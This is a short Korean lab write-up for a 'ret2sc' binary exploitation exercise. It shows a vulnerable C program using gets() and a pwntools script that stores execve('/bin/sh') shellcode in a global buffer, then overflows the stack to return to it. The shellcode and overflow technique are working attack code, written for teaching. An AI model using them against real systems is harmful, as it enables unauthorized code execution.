lab3
====
`ret2sc.c`에서 다음과 같은 코드를 볼 수 있었다.
```
#include <stdio.h>

char name[50];

int main(){
	setvbuf(stdout,0,2,0);
	printf("Name:");
	read(0,name,50);
	char buf[20];
	printf("Try your best:");
	gets(buf);
	return ;
}
```
먼저 `Name`을 입력 받은 후 `buf`값을 입력받는데 `Name`을 입력 받을 때에는 길이 검사를 하며 `buf`를 입력받을 때에는 길이검사가 없다.   
따라서 `buf`를 입력받을 때 bof를 시켜 `Name`주소로 ret시키고 `Name`에는 쉘코드를 넣어주면 해결 할 수 있을 것이다.

알아낸 `Name`의 주소는 `0x804a060`이였으며, 다음과 같이 코드를 작성하였다.
```
from pwn import*

p = process('./ret2sc')

name = 0x804a060

pl1 = ''
pl1 += '\x90'*10
pl1 += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69'
pl1 += '\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

pl2 = ''
pl2 += 'a'*32
pl2 += p32(name)

p.recvuntil(":")
p.send(pl1)
p.recvuntil(':')
p.send(pl2)

p.interactive()
```
![](https://postfiles.pstatic.net/MjAxOTA4MDJfMjU1/MDAxNTY0NzMyODEyMDU5.rR_beKFFZDCcs3ZtbJKSpinGAm-5MOtGaDMdLP_goHkg.dqOs30R6BxI3My2RL07mlbCF7j-0d78n_9f9OOSKoj0g.PNG.rlaeoghks823/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7,_2019-07-30_00-15-30.png?type=w773) 
